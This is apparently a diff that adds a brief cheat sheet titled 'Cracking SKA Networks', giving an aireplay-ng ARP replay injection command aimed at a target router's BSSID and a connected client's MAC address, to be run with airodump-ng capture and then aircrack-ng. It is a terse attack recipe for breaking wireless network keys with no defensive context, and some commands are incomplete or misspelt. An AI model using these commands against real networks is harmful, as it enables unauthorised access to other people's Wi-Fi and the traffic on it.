@@ -1,0 +1,5 @@
+Cracking SKA Networks
+
+
+aireplay-ng --arpreplay -b (BSSID/ROUTER) -h (Connected Device MAC Address) wlan0mon - -h is any device currently connected to the target router; to be run along wisde with airodump-ng --write -Requires any client already connected to network
+Run aircrack-ng
